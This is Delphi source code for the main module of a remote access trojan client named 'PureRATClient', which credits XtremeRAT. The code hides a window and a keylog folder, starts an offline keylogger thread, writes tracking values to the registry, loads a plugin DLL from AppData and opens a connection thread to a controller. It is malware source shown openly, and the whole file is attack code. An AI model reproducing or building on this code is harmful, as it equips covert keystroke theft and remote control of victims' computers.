library Client;

{$IMAGEBASE 23140000}

uses
  Windows,
  UnitConstants,
  UnitObjeto,
  UnitVariables,
  UnitFunctions,
  UnitConnection,
  UnitConfiguration,
  UnitKeyboardInputs,
  UnitWindowProc,
  UnitPluginManager;

//From XtremeRAT
procedure InitClientObject;
begin
  ClientObject := TMyObject.Create('PureRATClient', @ClientWindowProc);
  ShowWindow(ClientObject.Handle, SW_HIDE);
end;

begin
  LoadConfiguration;

  Pluginfile := AppDataDir + 'plugin.dll';
  KeylogsPath := AppDataDir + 'Keylogs';
  Sqlite3file := AppDataDir + 'sqlite3.dll';

  if (_Install) and (_Keylogger) then
  begin
    if DirectoryExists(KeylogsPath) = False then
    CreateDirectory(PChar(KeylogsPath), nil);
    HideFileName(KeylogsPath);
    StartThread(@StartOfflineKeylogger);
  end;
        
  if ReadKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'Identification', '') = ''
  then
  begin
    NewIdentification := _ClientId;
    CreateKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'Identification', NewIdentification);
  end
  else NewIdentification := ReadKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'Identification', '');
    
  if _Install = True then
  begin
    if ReadKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'First execution', '') <> 'True' then
    begin
      CreateKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'First execution', 'True');
      FirstExecution := True;
    end
    else FirstExecution := True;
  end;

  if FirstExecution = True then
  begin
    InstalledDate := MyGetDate('-');
    CreateKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId, 'Install date', InstalledDate);
  end;
                                
  InitClientObject;
  if FileExists(Pluginfile) then LoadPlugin;
  StartThread(@StartConnection);

  while True do ProcessMessages;
end.
